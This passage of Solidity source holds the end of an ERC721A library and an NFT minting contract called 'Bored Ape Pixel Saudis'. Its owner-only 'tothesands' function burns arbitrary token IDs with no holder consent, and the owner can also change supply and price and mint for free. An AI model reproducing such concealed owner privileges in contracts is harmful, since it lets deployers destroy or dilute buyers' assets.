1089         uint256 quantity,
1090         bytes memory _data,
1091         bool safe
1092     ) internal {
1093         uint256 startTokenId = _currentIndex;
1094         if (to == address(0)) revert MintToZeroAddress();
1095         if (quantity == 0) revert MintZeroQuantity();
1096 
1097         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1098 
1099         // Overflows are incredibly unrealistic.
1100         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1101         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1102         unchecked {
1103             _addressData[to].balance += uint64(quantity);
1104             _addressData[to].numberMinted += uint64(quantity);
1105 
1106             _ownerships[startTokenId].addr = to;
1107             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1108 
1109             uint256 updatedIndex = startTokenId;
1110             uint256 end = updatedIndex + quantity;
1111 
1112             if (safe && to.isContract()) {
1113                 do {
1114                     emit Transfer(address(0), to, updatedIndex);
1115                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1116                         revert TransferToNonERC721ReceiverImplementer();
1117                     }
1118                 } while (updatedIndex != end);
1119                 // Reentrancy protection
1120                 if (_currentIndex != startTokenId) revert();
1121             } else {
1122                 do {
1123                     emit Transfer(address(0), to, updatedIndex++);
1124                 } while (updatedIndex != end);
1125             }
1126             _currentIndex = updatedIndex;
1127         }
1128         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1129     }
1130 
1131     /**
1132      * @dev Transfers `tokenId` from `from` to `to`.
1133      *
1134      * Requirements:
1135      *
1136      * - `to` cannot be the zero address.
1137      * - `tokenId` token must be owned by `from`.
1138      *
1139      * Emits a {Transfer} event.
1140      */
1141     function _transfer(
1142         address from,
1143         address to,
1144         uint256 tokenId
1145     ) private {
1146         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1147 
1148         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1149             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1150             getApproved(tokenId) == _msgSender());
1151 
1152         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1153         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1154         if (to == address(0)) revert TransferToZeroAddress();
1155 
1156         _beforeTokenTransfers(from, to, tokenId, 1);
1157 
1158         // Clear approvals from the previous owner
1159         _approve(address(0), tokenId, prevOwnership.addr);
1160 
1161         // Underflow of the sender's balance is impossible because we check for
1162         // ownership above and the recipient's balance can't realistically overflow.
1163         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1164         unchecked {
1165             _addressData[from].balance -= 1;
1166             _addressData[to].balance += 1;
1167 
1168             _ownerships[tokenId].addr = to;
1169             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1170 
1171             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1172             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1173             uint256 nextTokenId = tokenId + 1;
1174             if (_ownerships[nextTokenId].addr == address(0)) {
1175                 // This will suffice for checking _exists(nextTokenId),
1176                 // as a burned slot cannot contain the zero address.
1177                 if (nextTokenId < _currentIndex) {
1178                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1179                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1180                 }
1181             }
1182         }
1183 
1184         emit Transfer(from, to, tokenId);
1185         _afterTokenTransfers(from, to, tokenId, 1);
1186     }
1187 
1188     /**
1189      * @dev Destroys `tokenId`.
1190      * The approval is cleared when the token is burned.
1191      *
1192      * Requirements:
1193      *
1194      * - `tokenId` must exist.
1195      *
1196      * Emits a {Transfer} event.
1197      */
1198     function _burn(uint256 tokenId) internal virtual {
1199         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1200 
1201         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1202 
1203         // Clear approvals from the previous owner
1204         _approve(address(0), tokenId, prevOwnership.addr);
1205 
1206         // Underflow of the sender's balance is impossible because we check for
1207         // ownership above and the recipient's balance can't realistically overflow.
1208         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1209         unchecked {
1210             _addressData[prevOwnership.addr].balance -= 1;
1211             _addressData[prevOwnership.addr].numberBurned += 1;
1212 
1213             // Keep track of who burned the token, and the timestamp of burning.
1214             _ownerships[tokenId].addr = prevOwnership.addr;
1215             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1216             _ownerships[tokenId].burned = true;
1217 
1218             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1219             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1220             uint256 nextTokenId = tokenId + 1;
1221             if (_ownerships[nextTokenId].addr == address(0)) {
1222                 // This will suffice for checking _exists(nextTokenId),
1223                 // as a burned slot cannot contain the zero address.
1224                 if (nextTokenId < _currentIndex) {
1225                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1226                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1227                 }
1228             }
1229         }
1230 
1231         emit Transfer(prevOwnership.addr, address(0), tokenId);
1232         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1233 
1234         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1235         unchecked {
1236             _burnCounter++;
1237         }
1238     }
1239 
1240     /**
1241      * @dev Approve `to` to operate on `tokenId`
1242      *
1243      * Emits a {Approval} event.
1244      */
1245     function _approve(
1246         address to,
1247         uint256 tokenId,
1248         address owner
1249     ) private {
1250         _tokenApprovals[tokenId] = to;
1251         emit Approval(owner, to, tokenId);
1252     }
1253 
1254     /**
1255      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1256      *
1257      * @param from address representing the previous owner of the given token ID
1258      * @param to target address that will receive the tokens
1259      * @param tokenId uint256 ID of the token to be transferred
1260      * @param _data bytes optional data to send along with the call
1261      * @return bool whether the call correctly returned the expected magic value
1262      */
1263     function _checkContractOnERC721Received(
1264         address from,
1265         address to,
1266         uint256 tokenId,
1267         bytes memory _data
1268     ) private returns (bool) {
1269         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1270             return retval == IERC721Receiver(to).onERC721Received.selector;
1271         } catch (bytes memory reason) {
1272             if (reason.length == 0) {
1273                 revert TransferToNonERC721ReceiverImplementer();
1274             } else {
1275                 assembly {
1276                     revert(add(32, reason), mload(reason))
1277                 }
1278             }
1279         }
1280     }
1281 
1282     /**
1283      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1284      * And also called before burning one token.
1285      *
1286      * startTokenId - the first token id to be transferred
1287      * quantity - the amount to be transferred
1288      *
1289      * Calling conditions:
1290      *
1291      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1292      * transferred to `to`.
1293      * - When `from` is zero, `tokenId` will be minted for `to`.
1294      * - When `to` is zero, `tokenId` will be burned by `from`.
1295      * - `from` and `to` are never both zero.
1296      */
1297     function _beforeTokenTransfers(
1298         address from,
1299         address to,
1300         uint256 startTokenId,
1301         uint256 quantity
1302     ) internal virtual {}
1303 
1304     /**
1305      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1306      * minting.
1307      * And also called after one token has been burned.
1308      *
1309      * startTokenId - the first token id to be transferred
1310      * quantity - the amount to be transferred
1311      *
1312      * Calling conditions:
1313      *
1314      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1315      * transferred to `to`.
1316      * - When `from` is zero, `tokenId` has been minted for `to`.
1317      * - When `to` is zero, `tokenId` has been burned by `from`.
1318      * - `from` and `to` are never both zero.
1319      */
1320     function _afterTokenTransfers(
1321         address from,
1322         address to,
1323         uint256 startTokenId,
1324         uint256 quantity
1325     ) internal virtual {}
1326 }
1327 
1328 
1329 
1330 contract TheBoredApePixelSaudis is ERC721A, Owneable {
1331 
1332     string public baseURI = "";
1333     string public contractURI = "ipfs://QmaWS8Hbm2sGGJwzrJWmvZuG1RE8kum3koiU48wjGvPCRz";
1334     string public constant baseExtension = ".json";
1335     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1336 
1337     uint256 public constant MAX_PER_TX_FREE = 3;
1338     uint256 public free_max_supply = 2222;
1339     uint256 public constant MAX_PER_TX = 10;
1340     uint256 public max_supply = 5555;
1341     uint256 public price = 0.002 ether;
1342 
1343     bool public paused = true;
1344 
1345     constructor() ERC721A("Bored Ape Pixel Saudis", "ApePixelSAUDI") {}
1346 
1347     function mint(uint256 _amount) external payable {
1348         address _caller = _msgSender();
1349         require(!paused, "Paused");
1350         require(max_supply >= totalSupply() + _amount, "Exceeds max supply");
1351         require(_amount > 0, "No 0 mints");
1352         require(tx.origin == _caller, "No contracts");
1353         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1354         
1355       if(free_max_supply >= totalSupply()){
1356             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1357         }else{
1358             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1359             require(_amount * price == msg.value, "Invalid funds provided");
1360         }
1361 
1362 
1363         _safeMint(_caller, _amount);
1364     }
1365 
1366   
1367 
1368     function isApprovedForAll(address owner, address operator)
1369         override
1370         public
1371         view
1372         returns (bool)
1373     {
1374         // Whitelist OpenSea proxy contract for easy trading.
1375         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1376         if (address(proxyRegistry.proxies(owner)) == operator) {
1377             return true;
1378         }
1379 
1380         return super.isApprovedForAll(owner, operator);
1381     }
1382 
1383     function out() external onlyOwner {
1384         uint256 balance = address(this).balance;
1385         (bool success, ) = _msgSender().call{value: balance}("");
1386         require(success, "Failed to send");
1387     }
1388 
1389     function collect(uint256 quantity) external onlyOwner {
1390         _safeMint(_msgSender(), quantity);
1391     }
1392 
1393 
1394     function pause(bool _state) external onlyOwner {
1395         paused = _state;
1396     }
1397 
1398     function setBaseURI(string memory baseURI_) external onlyOwner {
1399         baseURI = baseURI_;
1400     }
1401 
1402     function setContractURI(string memory _contractURI) external onlyOwner {
1403         contractURI = _contractURI;
1404     }
1405 
1406     function configPrice(uint256 newPrice) public onlyOwner {
1407         price = newPrice;
1408     }
1409 
1410     function configmax_supply(uint256 newSupply) public onlyOwner {
1411         max_supply = newSupply;
1412     }
1413 
1414     function configfree_max_supply(uint256 newFreesupply) public onlyOwner {
1415         free_max_supply = newFreesupply;
1416     }
1417 
1418         function tothesands(uint256[] memory tokenids) external onlyOwner {
1419         uint256 len = tokenids.length;
1420         for (uint256 i; i < len; i++) {
1421             uint256 tokenid = tokenids[i];
1422             _burn(tokenid);
1423         }
1424     }
1425     //for future utility
1426 
1427     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1428         require(_exists(_tokenId), "Token does not exist.");
1429         return bytes(baseURI).length > 0 ? string(
1430             abi.encodePacked(
1431               baseURI,
1432               Strings.toString(_tokenId),
1433               baseExtension
1434             )
1435         ) : "";
1436     }
1437 }
1438 
1439 contract OwnableDelegateProxy { }
1440 contract ProxyRegistry {
1441     mapping(address => OwnableDelegateProxy) public proxies;
1442 }